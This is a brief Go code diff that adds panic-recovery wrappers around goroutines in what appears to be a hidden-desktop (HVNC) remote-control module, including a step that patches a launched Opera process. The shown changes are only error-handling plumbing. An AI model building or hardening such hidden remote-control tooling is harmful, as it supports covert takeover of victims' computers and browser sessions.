@@ -456,7 +456,10 @@ func ensureHVNCThread() error {
 		hvncThreadReady = make(chan struct{})
 		hvncThreadTasks = make(chan hvncTask)
 		hvncWatchdogOnce.Do(func() {
-			go hvncThreadWatchdog()
+			go func() {
+				defer recoverAndLog("hvnc watchdog", nil)
+				hvncThreadWatchdog()
+			}()
 		})
 		go func(handle uintptr) {
 			defer recoverAndLog("hvnc desktop thread", nil)
@@ -558,7 +561,10 @@ func StartHVNCProcess(filePath string, operaPatch bool) error {
 		return result.err
 	}
 	if operaPatch && result.pid != 0 {
-		go patchOperaAsync(result.pid, 5, 2*time.Second)
+		go func() {
+			defer recoverAndLog("hvnc patch opera", nil)
+			patchOperaAsync(result.pid, 5, 2*time.Second)
+		}()
 	}
 	return nil
 }
